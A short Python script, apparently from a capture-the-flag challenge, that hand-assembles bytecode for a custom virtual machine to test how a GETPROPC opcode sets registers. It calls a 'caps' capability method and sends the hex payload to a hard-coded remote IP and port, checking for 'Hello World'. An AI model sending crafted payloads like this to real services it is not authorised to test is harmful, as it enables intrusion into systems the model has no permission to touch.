import socket
import struct
import time

def p8(x): return struct.pack('<B', x)
def p16(x): return struct.pack('<H', x)

print("FIXED: Understanding GETPROPC register usage")
print("="*70)
print("GETPROPC format: [0x21] [result_reg] [this_reg] [obj_reg] [key]")
print("It writes:")
print("  N[result_reg] = property value")
print("  N[this_reg] = object ('this' for method calls)")
print()
print("So the second parameter is BOTH input (pc_id) AND output (this_reg)!")
print("="*70)
print()

# Test with proper register allocation
consts = [
    b"caps",
    b"test",
]

payload = b""
payload += p8(0x16)  # More registers to avoid conflicts
payload += p8(len(consts))

for c in consts:
    payload += p8(0x02)
    payload += p16(len(c))
    payload += c

code = b""

# r0 = global["caps"]
code += p8(0x02) + p8(0x00) + p8(0x00)

# r1 = r0.c
code += p8(0x20) + p8(0x01) + p8(0x00) + p8(0x03)

# GETPROPC r2, r3 (this), r1, key=10
# This sets: r2=value, r3='this'
code += p8(0x21) + p8(0x02) + p8(0x03) + p8(0x01) + p8(0x0a)

# r4 = "test"
code += p8(0x01) + p8(0x04) + p8(0x01)

# r5 = r2.call(r3, [r4])
code += p8(0x30) + p8(0x05) + p8(0x02) + p8(0x03) + p8(0x01) + p8(0x04)

# RET r5
code += p8(0x31) + p8(0x05)

payload += code
hex_payload = payload.hex()

print(f"Payload: {hex_payload}\n")

HOST = '35.245.96.82'
PORT = 5000

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((HOST, PORT))
    
    s.sendall(hex_payload.encode() + b'\n')
    time.sleep(1)
    
    response = s.recv(8192).decode('utf-8', errors='replace')
    print(f"Response: '{response}'")
    
    if 'Hello World' in response:
        print("\n✓ SUCCESS! Basic read works!")
    
    s.close()
except Exception as e:
    print(f"Error: {e}")
